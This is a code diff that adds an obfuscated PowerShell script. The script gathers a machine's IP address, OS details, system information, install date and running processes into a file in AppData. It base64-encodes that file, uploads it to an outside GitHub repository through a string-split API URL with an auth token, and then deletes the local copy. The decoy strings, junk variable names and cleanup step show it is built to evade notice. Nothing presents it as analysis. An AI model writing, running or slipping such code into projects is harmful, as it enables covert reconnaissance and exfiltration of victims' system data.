@@ -1,0 +1,41 @@
+
+$sfgjhfg234124qweqe = Join-Path $env:AppData "Microsoft";
+$hgfehwg1u2123df= "sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$gggie128kmnvvkr3rf = "hjdghkjahghioguhi"
+$uuuieuyugfjgh8978dfg= "sdjkdgdgdgghjkldshgjkldhsgjkdshgjkhkjfgl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$iiiowcsjoooodfhjfpp12df = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0]
+$currentTime = Get-Date -Format "MMdd_HHmm"
+$ffhskj548sjhf = "$iiiowcsjoooodfhjfpp12df-$currentTime-0956_info.txt"
+
+$sssuibvdsjtv982710gjk = Join-Path $sfgjhfg234124qweqe $ffhskj548sjhf
+(Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Out-File -FilePath $sssuibvdsjtv982710gjk
+(Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture) | Out-File -FilePath $sssuibvdsjtv982710gjk -Append
+ Get-WmiObject -Class Win32_ComputerSystem | Out-File -FilePath $sssuibvdsjtv982710gjk -Append
+if ((Get-WmiObject -Class Win32_ComputerSystem).PCSystemType -eq 2) {
+    Write-Output "Note" | Out-File -FilePath $sssuibvdsjtv982710gjk -Append
+} else {
+    Write-Output "Desk" | Out-File -FilePath $sssuibvdsjtv982710gjk -Append
+}
+#(Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct).displayName | Out-File -FilePath $sssuibvdsjtv982710gjk -Append
+ (Get-WmiObject Win32_OperatingSystem).InstallDate | Out-File -FilePath $sssuibvdsjtv982710gjk -Append
+$ooppwkjfi123 = Get-Process
+$ooppwkjfi123 | Out-File -FilePath $sssuibvdsjtv982710gjk -Append
+$outputFile = Split-Path $sssuibvdsjtv982710gjk -leaf
+$ioiioiwefj12fj= "1243435sdjkghjkldshgjkldhsgjkdshgjkhkjfgl;kjklddsgdgdsgesgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$UUJKSIQ098FKJSH = "htt"+"ps"+":/"+"/a" + "pi.g" + "ith" + "ub.com/re" 
+$trtdhfjkg= "sdjkghjkldshgjkldhsgjkdshgjkhkjffght234243gl;kjkldsgjl;kdjgkeiorgjioejrgjdlksjglkjdsgkdsgkh";
+$UUJKSIQ098FKJSH += "pos/kamhavin/test/contents/store/" + $ffhskj548sjhf
+$ffkjfkjhsiouwe09s = Get-Content -Path $sssuibvdsjtv982710gjk  -Encoding Byte
+$jkkkskkuebkc287 = [Convert]::ToBase64String($ffkjfkjhsiouwe09s)
+$bbkjhdsjgklh89dd = @{
+    message = "Upload file $ffhskj548sjhf"
+    content = $jkkkskkuebkc287
+    branch = "main"
+}
+$hhhhjkldvbi89012 = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$hhhhjkldvbi89012.Add("Authorization", "token $gggie128kmnvvkr3rf")
+$hhhhjkldvbi89012.Add("Content-Type", 'application/json')
+$ccvcvchdiauyadsf = "djdaidjashdgfhyuwgd128738172396178312237816397812639786id"
+Invoke-RestMethod -Uri $UUJKSIQ098FKJSH -Method Put -Body ($bbkjhdsjgklh89dd | ConvertTo-Json) -Headers $hhhhjkldvbi89012
+Remove-Item -Path $sssuibvdsjtv982710gjk;
+
